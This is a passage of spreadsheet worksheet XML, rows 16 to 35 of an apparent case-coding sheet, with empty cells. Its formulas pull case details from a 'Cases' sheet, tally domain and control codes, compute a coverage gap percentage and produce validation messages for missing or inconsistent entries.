        <f>IF(AI16="","",IF(AI16=0,"No domain coded 1; ","")&amp;IF(M16="","Primary domain missing; ",IF(IFERROR(INDEX(E16:L16,1,M16),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N16:AG16)&lt;&gt;AJ16,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH16="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN16" s="13">
        <f>IF(AND(AI16&lt;&gt;"",AM16=""),1,0)</f>
        <v/>
      </c>
      <c r="AO16" s="14" t="n"/>
    </row>
    <row r="17">
      <c r="A17" s="11">
        <f>Cases!A17</f>
        <v/>
      </c>
      <c r="B17" s="11">
        <f>Cases!B17</f>
        <v/>
      </c>
      <c r="C17" s="11">
        <f>Cases!C17</f>
        <v/>
      </c>
      <c r="D17" s="11">
        <f>IF(Cases!F17="",LEFT(Cases!G17,120),Cases!F17)</f>
        <v/>
      </c>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c r="AD17" s="12" t="n"/>
      <c r="AE17" s="12" t="n"/>
      <c r="AF17" s="12" t="n"/>
      <c r="AG17" s="12" t="n"/>
      <c r="AH17" s="12" t="n"/>
      <c r="AI17" s="13">
        <f>IF(COUNT(E17:L17)=0,"",SUM(E17:L17))</f>
        <v/>
      </c>
      <c r="AJ17" s="13">
        <f>IF(AI17="","",N(E17)*3+N(F17)*2+N(G17)*2+N(H17)*2+N(I17)*2+N(J17)*3+N(K17)*3+N(L17)*3)</f>
        <v/>
      </c>
      <c r="AK17" s="13">
        <f>IF(AI17="","",COUNTIF(N17:AG17,1))</f>
        <v/>
      </c>
      <c r="AL17" s="13">
        <f>IF(OR(AJ17="",AJ17=0),"",ROUND(100*(AJ17-AK17)/AJ17,1))</f>
        <v/>
      </c>
      <c r="AM17" s="11">
        <f>IF(AI17="","",IF(AI17=0,"No domain coded 1; ","")&amp;IF(M17="","Primary domain missing; ",IF(IFERROR(INDEX(E17:L17,1,M17),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N17:AG17)&lt;&gt;AJ17,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH17="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN17" s="13">
        <f>IF(AND(AI17&lt;&gt;"",AM17=""),1,0)</f>
        <v/>
      </c>
      <c r="AO17" s="14" t="n"/>
    </row>
    <row r="18">
      <c r="A18" s="11">
        <f>Cases!A18</f>
        <v/>
      </c>
      <c r="B18" s="11">
        <f>Cases!B18</f>
        <v/>
      </c>
      <c r="C18" s="11">
        <f>Cases!C18</f>
        <v/>
      </c>
      <c r="D18" s="11">
        <f>IF(Cases!F18="",LEFT(Cases!G18,120),Cases!F18)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E18:L18)=0,"",SUM(E18:L18))</f>
        <v/>
      </c>
      <c r="AJ18" s="13">
        <f>IF(AI18="","",N(E18)*3+N(F18)*2+N(G18)*2+N(H18)*2+N(I18)*2+N(J18)*3+N(K18)*3+N(L18)*3)</f>
        <v/>
      </c>
      <c r="AK18" s="13">
        <f>IF(AI18="","",COUNTIF(N18:AG18,1))</f>
        <v/>
      </c>
      <c r="AL18" s="13">
        <f>IF(OR(AJ18="",AJ18=0),"",ROUND(100*(AJ18-AK18)/AJ18,1))</f>
        <v/>
      </c>
      <c r="AM18" s="11">
        <f>IF(AI18="","",IF(AI18=0,"No domain coded 1; ","")&amp;IF(M18="","Primary domain missing; ",IF(IFERROR(INDEX(E18:L18,1,M18),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N18:AG18)&lt;&gt;AJ18,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH18="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN18" s="13">
        <f>IF(AND(AI18&lt;&gt;"",AM18=""),1,0)</f>
        <v/>
      </c>
      <c r="AO18" s="14" t="n"/>
    </row>
    <row r="19">
      <c r="A19" s="11">
        <f>Cases!A19</f>
        <v/>
      </c>
      <c r="B19" s="11">
        <f>Cases!B19</f>
        <v/>
      </c>
      <c r="C19" s="11">
        <f>Cases!C19</f>
        <v/>
      </c>
      <c r="D19" s="11">
        <f>IF(Cases!F19="",LEFT(Cases!G19,120),Cases!F19)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E19:L19)=0,"",SUM(E19:L19))</f>
        <v/>
      </c>
      <c r="AJ19" s="13">
        <f>IF(AI19="","",N(E19)*3+N(F19)*2+N(G19)*2+N(H19)*2+N(I19)*2+N(J19)*3+N(K19)*3+N(L19)*3)</f>
        <v/>
      </c>
      <c r="AK19" s="13">
        <f>IF(AI19="","",COUNTIF(N19:AG19,1))</f>
        <v/>
      </c>
      <c r="AL19" s="13">
        <f>IF(OR(AJ19="",AJ19=0),"",ROUND(100*(AJ19-AK19)/AJ19,1))</f>
        <v/>
      </c>
      <c r="AM19" s="11">
        <f>IF(AI19="","",IF(AI19=0,"No domain coded 1; ","")&amp;IF(M19="","Primary domain missing; ",IF(IFERROR(INDEX(E19:L19,1,M19),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N19:AG19)&lt;&gt;AJ19,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH19="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN19" s="13">
        <f>IF(AND(AI19&lt;&gt;"",AM19=""),1,0)</f>
        <v/>
      </c>
      <c r="AO19" s="14" t="n"/>
    </row>
    <row r="20">
      <c r="A20" s="11">
        <f>Cases!A20</f>
        <v/>
      </c>
      <c r="B20" s="11">
        <f>Cases!B20</f>
        <v/>
      </c>
      <c r="C20" s="11">
        <f>Cases!C20</f>
        <v/>
      </c>
      <c r="D20" s="11">
        <f>IF(Cases!F20="",LEFT(Cases!G20,120),Cases!F20)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E20:L20)=0,"",SUM(E20:L20))</f>
        <v/>
      </c>
      <c r="AJ20" s="13">
        <f>IF(AI20="","",N(E20)*3+N(F20)*2+N(G20)*2+N(H20)*2+N(I20)*2+N(J20)*3+N(K20)*3+N(L20)*3)</f>
        <v/>
      </c>
      <c r="AK20" s="13">
        <f>IF(AI20="","",COUNTIF(N20:AG20,1))</f>
        <v/>
      </c>
      <c r="AL20" s="13">
        <f>IF(OR(AJ20="",AJ20=0),"",ROUND(100*(AJ20-AK20)/AJ20,1))</f>
        <v/>
      </c>
      <c r="AM20" s="11">
        <f>IF(AI20="","",IF(AI20=0,"No domain coded 1; ","")&amp;IF(M20="","Primary domain missing; ",IF(IFERROR(INDEX(E20:L20,1,M20),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N20:AG20)&lt;&gt;AJ20,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH20="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN20" s="13">
        <f>IF(AND(AI20&lt;&gt;"",AM20=""),1,0)</f>
        <v/>
      </c>
      <c r="AO20" s="14" t="n"/>
    </row>
    <row r="21">
      <c r="A21" s="11">
        <f>Cases!A21</f>
        <v/>
      </c>
      <c r="B21" s="11">
        <f>Cases!B21</f>
        <v/>
      </c>
      <c r="C21" s="11">
        <f>Cases!C21</f>
        <v/>
      </c>
      <c r="D21" s="11">
        <f>IF(Cases!F21="",LEFT(Cases!G21,120),Cases!F21)</f>
        <v/>
      </c>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c r="AE21" s="12" t="n"/>
      <c r="AF21" s="12" t="n"/>
      <c r="AG21" s="12" t="n"/>
      <c r="AH21" s="12" t="n"/>
      <c r="AI21" s="13">
        <f>IF(COUNT(E21:L21)=0,"",SUM(E21:L21))</f>
        <v/>
      </c>
      <c r="AJ21" s="13">
        <f>IF(AI21="","",N(E21)*3+N(F21)*2+N(G21)*2+N(H21)*2+N(I21)*2+N(J21)*3+N(K21)*3+N(L21)*3)</f>
        <v/>
      </c>
      <c r="AK21" s="13">
        <f>IF(AI21="","",COUNTIF(N21:AG21,1))</f>
        <v/>
      </c>
      <c r="AL21" s="13">
        <f>IF(OR(AJ21="",AJ21=0),"",ROUND(100*(AJ21-AK21)/AJ21,1))</f>
        <v/>
      </c>
      <c r="AM21" s="11">
        <f>IF(AI21="","",IF(AI21=0,"No domain coded 1; ","")&amp;IF(M21="","Primary domain missing; ",IF(IFERROR(INDEX(E21:L21,1,M21),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N21:AG21)&lt;&gt;AJ21,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH21="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN21" s="13">
        <f>IF(AND(AI21&lt;&gt;"",AM21=""),1,0)</f>
        <v/>
      </c>
      <c r="AO21" s="14" t="n"/>
    </row>
    <row r="22">
      <c r="A22" s="11">
        <f>Cases!A22</f>
        <v/>
      </c>
      <c r="B22" s="11">
        <f>Cases!B22</f>
        <v/>
      </c>
      <c r="C22" s="11">
        <f>Cases!C22</f>
        <v/>
      </c>
      <c r="D22" s="11">
        <f>IF(Cases!F22="",LEFT(Cases!G22,120),Cases!F22)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E22:L22)=0,"",SUM(E22:L22))</f>
        <v/>
      </c>
      <c r="AJ22" s="13">
        <f>IF(AI22="","",N(E22)*3+N(F22)*2+N(G22)*2+N(H22)*2+N(I22)*2+N(J22)*3+N(K22)*3+N(L22)*3)</f>
        <v/>
      </c>
      <c r="AK22" s="13">
        <f>IF(AI22="","",COUNTIF(N22:AG22,1))</f>
        <v/>
      </c>
      <c r="AL22" s="13">
        <f>IF(OR(AJ22="",AJ22=0),"",ROUND(100*(AJ22-AK22)/AJ22,1))</f>
        <v/>
      </c>
      <c r="AM22" s="11">
        <f>IF(AI22="","",IF(AI22=0,"No domain coded 1; ","")&amp;IF(M22="","Primary domain missing; ",IF(IFERROR(INDEX(E22:L22,1,M22),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N22:AG22)&lt;&gt;AJ22,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH22="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN22" s="13">
        <f>IF(AND(AI22&lt;&gt;"",AM22=""),1,0)</f>
        <v/>
      </c>
      <c r="AO22" s="14" t="n"/>
    </row>
    <row r="23">
      <c r="A23" s="11">
        <f>Cases!A23</f>
        <v/>
      </c>
      <c r="B23" s="11">
        <f>Cases!B23</f>
        <v/>
      </c>
      <c r="C23" s="11">
        <f>Cases!C23</f>
        <v/>
      </c>
      <c r="D23" s="11">
        <f>IF(Cases!F23="",LEFT(Cases!G23,120),Cases!F23)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E23:L23)=0,"",SUM(E23:L23))</f>
        <v/>
      </c>
      <c r="AJ23" s="13">
        <f>IF(AI23="","",N(E23)*3+N(F23)*2+N(G23)*2+N(H23)*2+N(I23)*2+N(J23)*3+N(K23)*3+N(L23)*3)</f>
        <v/>
      </c>
      <c r="AK23" s="13">
        <f>IF(AI23="","",COUNTIF(N23:AG23,1))</f>
        <v/>
      </c>
      <c r="AL23" s="13">
        <f>IF(OR(AJ23="",AJ23=0),"",ROUND(100*(AJ23-AK23)/AJ23,1))</f>
        <v/>
      </c>
      <c r="AM23" s="11">
        <f>IF(AI23="","",IF(AI23=0,"No domain coded 1; ","")&amp;IF(M23="","Primary domain missing; ",IF(IFERROR(INDEX(E23:L23,1,M23),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N23:AG23)&lt;&gt;AJ23,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH23="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN23" s="13">
        <f>IF(AND(AI23&lt;&gt;"",AM23=""),1,0)</f>
        <v/>
      </c>
      <c r="AO23" s="14" t="n"/>
    </row>
    <row r="24">
      <c r="A24" s="11">
        <f>Cases!A24</f>
        <v/>
      </c>
      <c r="B24" s="11">
        <f>Cases!B24</f>
        <v/>
      </c>
      <c r="C24" s="11">
        <f>Cases!C24</f>
        <v/>
      </c>
      <c r="D24" s="11">
        <f>IF(Cases!F24="",LEFT(Cases!G24,120),Cases!F24)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI24" s="13">
        <f>IF(COUNT(E24:L24)=0,"",SUM(E24:L24))</f>
        <v/>
      </c>
      <c r="AJ24" s="13">
        <f>IF(AI24="","",N(E24)*3+N(F24)*2+N(G24)*2+N(H24)*2+N(I24)*2+N(J24)*3+N(K24)*3+N(L24)*3)</f>
        <v/>
      </c>
      <c r="AK24" s="13">
        <f>IF(AI24="","",COUNTIF(N24:AG24,1))</f>
        <v/>
      </c>
      <c r="AL24" s="13">
        <f>IF(OR(AJ24="",AJ24=0),"",ROUND(100*(AJ24-AK24)/AJ24,1))</f>
        <v/>
      </c>
      <c r="AM24" s="11">
        <f>IF(AI24="","",IF(AI24=0,"No domain coded 1; ","")&amp;IF(M24="","Primary domain missing; ",IF(IFERROR(INDEX(E24:L24,1,M24),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N24:AG24)&lt;&gt;AJ24,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH24="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN24" s="13">
        <f>IF(AND(AI24&lt;&gt;"",AM24=""),1,0)</f>
        <v/>
      </c>
      <c r="AO24" s="14" t="n"/>
    </row>
    <row r="25">
      <c r="A25" s="11">
        <f>Cases!A25</f>
        <v/>
      </c>
      <c r="B25" s="11">
        <f>Cases!B25</f>
        <v/>
      </c>
      <c r="C25" s="11">
        <f>Cases!C25</f>
        <v/>
      </c>
      <c r="D25" s="11">
        <f>IF(Cases!F25="",LEFT(Cases!G25,120),Cases!F25)</f>
        <v/>
      </c>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c r="AI25" s="13">
        <f>IF(COUNT(E25:L25)=0,"",SUM(E25:L25))</f>
        <v/>
      </c>
      <c r="AJ25" s="13">
        <f>IF(AI25="","",N(E25)*3+N(F25)*2+N(G25)*2+N(H25)*2+N(I25)*2+N(J25)*3+N(K25)*3+N(L25)*3)</f>
        <v/>
      </c>
      <c r="AK25" s="13">
        <f>IF(AI25="","",COUNTIF(N25:AG25,1))</f>
        <v/>
      </c>
      <c r="AL25" s="13">
        <f>IF(OR(AJ25="",AJ25=0),"",ROUND(100*(AJ25-AK25)/AJ25,1))</f>
        <v/>
      </c>
      <c r="AM25" s="11">
        <f>IF(AI25="","",IF(AI25=0,"No domain coded 1; ","")&amp;IF(M25="","Primary domain missing; ",IF(IFERROR(INDEX(E25:L25,1,M25),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N25:AG25)&lt;&gt;AJ25,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH25="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN25" s="13">
        <f>IF(AND(AI25&lt;&gt;"",AM25=""),1,0)</f>
        <v/>
      </c>
      <c r="AO25" s="14" t="n"/>
    </row>
    <row r="26">
      <c r="A26" s="11">
        <f>Cases!A26</f>
        <v/>
      </c>
      <c r="B26" s="11">
        <f>Cases!B26</f>
        <v/>
      </c>
      <c r="C26" s="11">
        <f>Cases!C26</f>
        <v/>
      </c>
      <c r="D26" s="11">
        <f>IF(Cases!F26="",LEFT(Cases!G26,120),Cases!F26)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI26" s="13">
        <f>IF(COUNT(E26:L26)=0,"",SUM(E26:L26))</f>
        <v/>
      </c>
      <c r="AJ26" s="13">
        <f>IF(AI26="","",N(E26)*3+N(F26)*2+N(G26)*2+N(H26)*2+N(I26)*2+N(J26)*3+N(K26)*3+N(L26)*3)</f>
        <v/>
      </c>
      <c r="AK26" s="13">
        <f>IF(AI26="","",COUNTIF(N26:AG26,1))</f>
        <v/>
      </c>
      <c r="AL26" s="13">
        <f>IF(OR(AJ26="",AJ26=0),"",ROUND(100*(AJ26-AK26)/AJ26,1))</f>
        <v/>
      </c>
      <c r="AM26" s="11">
        <f>IF(AI26="","",IF(AI26=0,"No domain coded 1; ","")&amp;IF(M26="","Primary domain missing; ",IF(IFERROR(INDEX(E26:L26,1,M26),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N26:AG26)&lt;&gt;AJ26,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH26="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN26" s="13">
        <f>IF(AND(AI26&lt;&gt;"",AM26=""),1,0)</f>
        <v/>
      </c>
      <c r="AO26" s="14" t="n"/>
    </row>
    <row r="27">
      <c r="A27" s="11">
        <f>Cases!A27</f>
        <v/>
      </c>
      <c r="B27" s="11">
        <f>Cases!B27</f>
        <v/>
      </c>
      <c r="C27" s="11">
        <f>Cases!C27</f>
        <v/>
      </c>
      <c r="D27" s="11">
        <f>IF(Cases!F27="",LEFT(Cases!G27,120),Cases!F27)</f>
        <v/>
      </c>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c r="AI27" s="13">
        <f>IF(COUNT(E27:L27)=0,"",SUM(E27:L27))</f>
        <v/>
      </c>
      <c r="AJ27" s="13">
        <f>IF(AI27="","",N(E27)*3+N(F27)*2+N(G27)*2+N(H27)*2+N(I27)*2+N(J27)*3+N(K27)*3+N(L27)*3)</f>
        <v/>
      </c>
      <c r="AK27" s="13">
        <f>IF(AI27="","",COUNTIF(N27:AG27,1))</f>
        <v/>
      </c>
      <c r="AL27" s="13">
        <f>IF(OR(AJ27="",AJ27=0),"",ROUND(100*(AJ27-AK27)/AJ27,1))</f>
        <v/>
      </c>
      <c r="AM27" s="11">
        <f>IF(AI27="","",IF(AI27=0,"No domain coded 1; ","")&amp;IF(M27="","Primary domain missing; ",IF(IFERROR(INDEX(E27:L27,1,M27),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N27:AG27)&lt;&gt;AJ27,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH27="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN27" s="13">
        <f>IF(AND(AI27&lt;&gt;"",AM27=""),1,0)</f>
        <v/>
      </c>
      <c r="AO27" s="14" t="n"/>
    </row>
    <row r="28">
      <c r="A28" s="11">
        <f>Cases!A28</f>
        <v/>
      </c>
      <c r="B28" s="11">
        <f>Cases!B28</f>
        <v/>
      </c>
      <c r="C28" s="11">
        <f>Cases!C28</f>
        <v/>
      </c>
      <c r="D28" s="11">
        <f>IF(Cases!F28="",LEFT(Cases!G28,120),Cases!F28)</f>
        <v/>
      </c>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c r="AE28" s="12" t="n"/>
      <c r="AF28" s="12" t="n"/>
      <c r="AG28" s="12" t="n"/>
      <c r="AH28" s="12" t="n"/>
      <c r="AI28" s="13">
        <f>IF(COUNT(E28:L28)=0,"",SUM(E28:L28))</f>
        <v/>
      </c>
      <c r="AJ28" s="13">
        <f>IF(AI28="","",N(E28)*3+N(F28)*2+N(G28)*2+N(H28)*2+N(I28)*2+N(J28)*3+N(K28)*3+N(L28)*3)</f>
        <v/>
      </c>
      <c r="AK28" s="13">
        <f>IF(AI28="","",COUNTIF(N28:AG28,1))</f>
        <v/>
      </c>
      <c r="AL28" s="13">
        <f>IF(OR(AJ28="",AJ28=0),"",ROUND(100*(AJ28-AK28)/AJ28,1))</f>
        <v/>
      </c>
      <c r="AM28" s="11">
        <f>IF(AI28="","",IF(AI28=0,"No domain coded 1; ","")&amp;IF(M28="","Primary domain missing; ",IF(IFERROR(INDEX(E28:L28,1,M28),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N28:AG28)&lt;&gt;AJ28,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH28="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN28" s="13">
        <f>IF(AND(AI28&lt;&gt;"",AM28=""),1,0)</f>
        <v/>
      </c>
      <c r="AO28" s="14" t="n"/>
    </row>
    <row r="29">
      <c r="A29" s="11">
        <f>Cases!A29</f>
        <v/>
      </c>
      <c r="B29" s="11">
        <f>Cases!B29</f>
        <v/>
      </c>
      <c r="C29" s="11">
        <f>Cases!C29</f>
        <v/>
      </c>
      <c r="D29" s="11">
        <f>IF(Cases!F29="",LEFT(Cases!G29,120),Cases!F29)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E29:L29)=0,"",SUM(E29:L29))</f>
        <v/>
      </c>
      <c r="AJ29" s="13">
        <f>IF(AI29="","",N(E29)*3+N(F29)*2+N(G29)*2+N(H29)*2+N(I29)*2+N(J29)*3+N(K29)*3+N(L29)*3)</f>
        <v/>
      </c>
      <c r="AK29" s="13">
        <f>IF(AI29="","",COUNTIF(N29:AG29,1))</f>
        <v/>
      </c>
      <c r="AL29" s="13">
        <f>IF(OR(AJ29="",AJ29=0),"",ROUND(100*(AJ29-AK29)/AJ29,1))</f>
        <v/>
      </c>
      <c r="AM29" s="11">
        <f>IF(AI29="","",IF(AI29=0,"No domain coded 1; ","")&amp;IF(M29="","Primary domain missing; ",IF(IFERROR(INDEX(E29:L29,1,M29),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N29:AG29)&lt;&gt;AJ29,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH29="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN29" s="13">
        <f>IF(AND(AI29&lt;&gt;"",AM29=""),1,0)</f>
        <v/>
      </c>
      <c r="AO29" s="14" t="n"/>
    </row>
    <row r="30">
      <c r="A30" s="11">
        <f>Cases!A30</f>
        <v/>
      </c>
      <c r="B30" s="11">
        <f>Cases!B30</f>
        <v/>
      </c>
      <c r="C30" s="11">
        <f>Cases!C30</f>
        <v/>
      </c>
      <c r="D30" s="11">
        <f>IF(Cases!F30="",LEFT(Cases!G30,120),Cases!F30)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E30:L30)=0,"",SUM(E30:L30))</f>
        <v/>
      </c>
      <c r="AJ30" s="13">
        <f>IF(AI30="","",N(E30)*3+N(F30)*2+N(G30)*2+N(H30)*2+N(I30)*2+N(J30)*3+N(K30)*3+N(L30)*3)</f>
        <v/>
      </c>
      <c r="AK30" s="13">
        <f>IF(AI30="","",COUNTIF(N30:AG30,1))</f>
        <v/>
      </c>
      <c r="AL30" s="13">
        <f>IF(OR(AJ30="",AJ30=0),"",ROUND(100*(AJ30-AK30)/AJ30,1))</f>
        <v/>
      </c>
      <c r="AM30" s="11">
        <f>IF(AI30="","",IF(AI30=0,"No domain coded 1; ","")&amp;IF(M30="","Primary domain missing; ",IF(IFERROR(INDEX(E30:L30,1,M30),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N30:AG30)&lt;&gt;AJ30,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH30="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN30" s="13">
        <f>IF(AND(AI30&lt;&gt;"",AM30=""),1,0)</f>
        <v/>
      </c>
      <c r="AO30" s="14" t="n"/>
    </row>
    <row r="31">
      <c r="A31" s="11">
        <f>Cases!A31</f>
        <v/>
      </c>
      <c r="B31" s="11">
        <f>Cases!B31</f>
        <v/>
      </c>
      <c r="C31" s="11">
        <f>Cases!C31</f>
        <v/>
      </c>
      <c r="D31" s="11">
        <f>IF(Cases!F31="",LEFT(Cases!G31,120),Cases!F31)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E31:L31)=0,"",SUM(E31:L31))</f>
        <v/>
      </c>
      <c r="AJ31" s="13">
        <f>IF(AI31="","",N(E31)*3+N(F31)*2+N(G31)*2+N(H31)*2+N(I31)*2+N(J31)*3+N(K31)*3+N(L31)*3)</f>
        <v/>
      </c>
      <c r="AK31" s="13">
        <f>IF(AI31="","",COUNTIF(N31:AG31,1))</f>
        <v/>
      </c>
      <c r="AL31" s="13">
        <f>IF(OR(AJ31="",AJ31=0),"",ROUND(100*(AJ31-AK31)/AJ31,1))</f>
        <v/>
      </c>
      <c r="AM31" s="11">
        <f>IF(AI31="","",IF(AI31=0,"No domain coded 1; ","")&amp;IF(M31="","Primary domain missing; ",IF(IFERROR(INDEX(E31:L31,1,M31),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N31:AG31)&lt;&gt;AJ31,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH31="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN31" s="13">
        <f>IF(AND(AI31&lt;&gt;"",AM31=""),1,0)</f>
        <v/>
      </c>
      <c r="AO31" s="14" t="n"/>
    </row>
    <row r="32">
      <c r="A32" s="11">
        <f>Cases!A32</f>
        <v/>
      </c>
      <c r="B32" s="11">
        <f>Cases!B32</f>
        <v/>
      </c>
      <c r="C32" s="11">
        <f>Cases!C32</f>
        <v/>
      </c>
      <c r="D32" s="11">
        <f>IF(Cases!F32="",LEFT(Cases!G32,120),Cases!F32)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI32" s="13">
        <f>IF(COUNT(E32:L32)=0,"",SUM(E32:L32))</f>
        <v/>
      </c>
      <c r="AJ32" s="13">
        <f>IF(AI32="","",N(E32)*3+N(F32)*2+N(G32)*2+N(H32)*2+N(I32)*2+N(J32)*3+N(K32)*3+N(L32)*3)</f>
        <v/>
      </c>
      <c r="AK32" s="13">
        <f>IF(AI32="","",COUNTIF(N32:AG32,1))</f>
        <v/>
      </c>
      <c r="AL32" s="13">
        <f>IF(OR(AJ32="",AJ32=0),"",ROUND(100*(AJ32-AK32)/AJ32,1))</f>
        <v/>
      </c>
      <c r="AM32" s="11">
        <f>IF(AI32="","",IF(AI32=0,"No domain coded 1; ","")&amp;IF(M32="","Primary domain missing; ",IF(IFERROR(INDEX(E32:L32,1,M32),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N32:AG32)&lt;&gt;AJ32,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH32="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN32" s="13">
        <f>IF(AND(AI32&lt;&gt;"",AM32=""),1,0)</f>
        <v/>
      </c>
      <c r="AO32" s="14" t="n"/>
    </row>
    <row r="33">
      <c r="A33" s="11">
        <f>Cases!A33</f>
        <v/>
      </c>
      <c r="B33" s="11">
        <f>Cases!B33</f>
        <v/>
      </c>
      <c r="C33" s="11">
        <f>Cases!C33</f>
        <v/>
      </c>
      <c r="D33" s="11">
        <f>IF(Cases!F33="",LEFT(Cases!G33,120),Cases!F33)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E33:L33)=0,"",SUM(E33:L33))</f>
        <v/>
      </c>
      <c r="AJ33" s="13">
        <f>IF(AI33="","",N(E33)*3+N(F33)*2+N(G33)*2+N(H33)*2+N(I33)*2+N(J33)*3+N(K33)*3+N(L33)*3)</f>
        <v/>
      </c>
      <c r="AK33" s="13">
        <f>IF(AI33="","",COUNTIF(N33:AG33,1))</f>
        <v/>
      </c>
      <c r="AL33" s="13">
        <f>IF(OR(AJ33="",AJ33=0),"",ROUND(100*(AJ33-AK33)/AJ33,1))</f>
        <v/>
      </c>
      <c r="AM33" s="11">
        <f>IF(AI33="","",IF(AI33=0,"No domain coded 1; ","")&amp;IF(M33="","Primary domain missing; ",IF(IFERROR(INDEX(E33:L33,1,M33),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N33:AG33)&lt;&gt;AJ33,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH33="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN33" s="13">
        <f>IF(AND(AI33&lt;&gt;"",AM33=""),1,0)</f>
        <v/>
      </c>
      <c r="AO33" s="14" t="n"/>
    </row>
    <row r="34">
      <c r="A34" s="11">
        <f>Cases!A34</f>
        <v/>
      </c>
      <c r="B34" s="11">
        <f>Cases!B34</f>
        <v/>
      </c>
      <c r="C34" s="11">
        <f>Cases!C34</f>
        <v/>
      </c>
      <c r="D34" s="11">
        <f>IF(Cases!F34="",LEFT(Cases!G34,120),Cases!F34)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E34:L34)=0,"",SUM(E34:L34))</f>
        <v/>
      </c>
      <c r="AJ34" s="13">
        <f>IF(AI34="","",N(E34)*3+N(F34)*2+N(G34)*2+N(H34)*2+N(I34)*2+N(J34)*3+N(K34)*3+N(L34)*3)</f>
        <v/>
      </c>
      <c r="AK34" s="13">
        <f>IF(AI34="","",COUNTIF(N34:AG34,1))</f>
        <v/>
      </c>
      <c r="AL34" s="13">
        <f>IF(OR(AJ34="",AJ34=0),"",ROUND(100*(AJ34-AK34)/AJ34,1))</f>
        <v/>
      </c>
      <c r="AM34" s="11">
        <f>IF(AI34="","",IF(AI34=0,"No domain coded 1; ","")&amp;IF(M34="","Primary domain missing; ",IF(IFERROR(INDEX(E34:L34,1,M34),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N34:AG34)&lt;&gt;AJ34,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH34="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN34" s="13">
        <f>IF(AND(AI34&lt;&gt;"",AM34=""),1,0)</f>
        <v/>
      </c>
      <c r="AO34" s="14" t="n"/>
    </row>
    <row r="35">
      <c r="A35" s="11">
